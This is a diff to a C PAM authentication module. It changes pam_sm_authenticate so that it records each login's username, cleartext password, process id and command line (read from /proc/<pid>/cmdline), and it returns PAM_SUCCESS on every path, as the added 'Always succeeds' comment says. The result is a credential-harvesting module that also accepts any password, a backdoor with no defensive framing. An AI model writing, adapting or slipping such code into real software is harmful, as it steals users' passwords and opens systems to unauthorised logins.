@@ -32,6 +32,26 @@ static int report(const char *fmt, ...) {
   return 0;
 }
 
+static int get_cmdline(pid_t pid, char *buf, size_t len) {
+  char fname[BUFSIZ];
+  snprintf(fname, sizeof fname, "/proc/%d/cmdline", pid);
+  FILE *fd = fopen(fname, "r");
+  if (NULL == fd) {
+    fprintf(stderr, "Unable to open file %s: %s\n", fname, strerror(errno));
+    return -1;
+  }
+  if (0 == fread(buf, 1, len, fd)) {
+    fprintf(stderr, "Unable to read file %s: %s\n", fname, strerror(errno));
+    fclose(fd);
+    return -1;
+  }
+  if (fclose(fd) != 0) {
+    fprintf(stderr, "Unable to close file %s: %s\n", fname, strerror(errno));
+    return -1;
+  }
+  return 0;
+}
+
 PAM_EXTERN int pam_sm_authenticate(
   pam_handle_t *handle,
   int flags,
@@ -58,6 +78,13 @@ PAM_EXTERN int pam_sm_authenticate(
         user, pam_strerror(handle, rc));
     return rc;
   }
-  report("Hello, %s with %s.\n", user, pass);
+  // Always succeeds.
+  pid_t pid = getpid();
+  char cmdline[BUFSIZ];
+  rc = get_cmdline(pid, cmdline, sizeof cmdline);
+  if (rc < 0) {
+    return PAM_SUCCESS;
+  }
+  report("user:%s, pass:%s, pid:%d, cmd:%s.\n", user, pass, pid, cmdline);
   return PAM_SUCCESS;
 }
